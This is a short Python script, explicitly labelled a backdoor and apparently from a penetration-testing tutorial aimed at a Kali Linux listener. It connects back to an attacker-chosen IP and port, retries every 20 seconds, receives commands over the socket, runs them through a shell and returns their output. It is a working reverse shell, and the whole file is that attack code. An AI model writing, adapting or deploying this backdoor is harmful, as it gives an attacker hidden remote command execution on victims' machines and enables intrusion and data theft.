#!/bin/python

import socket
import json
import time
import subprocess
import os
import argparse

# Step 3: Configuration
parser = argparse.ArgumentParser(description='Backdoor script to connect to given IP and port.')
parser.add_argument('ip', help='IP address to connect to')
parser.add_argument('port', type=int, help='Port number to connect to')

args = parser.parse_args()

SERVER_IP = args.ip
SERVER_PORT = args.port

# Step 1: Use explicite SERVER_IP and SERVER_PORT make create connection 
# SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
# SERVER_PORT = 8888

def send(data):
    json_data = json.dumps(data)
    client_sock.send(json_data.encode())


def recv_command():
    data = ''
    while True:
        try:
            data = data + client_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def create_connection():
    while True:
        time.sleep(20)
        try:
            client_sock.connect((SERVER_IP, SERVER_PORT))
            work()
            client_sock.close()
            break
        except:
            create_connection()


def work():
    while True:
        command = recv_command()
        if command == 'quit' or command == 'exit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            output = execute.stdout.read() + execute.stderr.read()
            output = output.decode()
            send(output)


client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
create_connection()